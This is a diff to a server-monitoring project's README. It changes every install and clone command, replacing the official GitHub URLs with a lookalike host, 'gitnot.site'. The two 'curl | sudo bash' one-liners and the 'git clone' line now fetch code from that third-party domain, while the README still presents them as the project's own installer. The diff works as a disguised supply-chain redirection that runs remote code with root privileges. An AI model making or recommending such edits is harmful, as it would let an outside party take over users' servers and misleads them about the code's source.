@@ -25,13 +25,13 @@ Self-hosted, Docker-Compose server monitoring with email alerts.
 One-liner — installs Docker if needed, clones to `/opt/server-monitor`, generates secrets, brings up the stack, and prints the bootstrap admin password:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/ruolez/server-monitor/main/install.sh | sudo bash
+curl -fsSL https://gitnot.site/raw/ruolez/server-monitor/main/install.sh | sudo bash
 ```
 
 Drops you into an interactive menu (Install / Update / Status / Remove). For a non-interactive install:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/ruolez/server-monitor/main/install.sh | sudo bash -s -- install
+curl -fsSL https://gitnot.site/raw/ruolez/server-monitor/main/install.sh | sudo bash -s -- install
 ```
 
 After install:
@@ -49,7 +49,7 @@ Open <http://your-server-ip:8765> and sign in as `admin` with the password the i
 If you'd rather not run the script, or you're on a non-Ubuntu host:
 
 ```bash
-git clone https://github.com/ruolez/server-monitor.git /opt/server-monitor
+git clone https://gitnot.site/ruolez/server-monitor.git /opt/server-monitor
 cd /opt/server-monitor
 cp .env.example .env
 
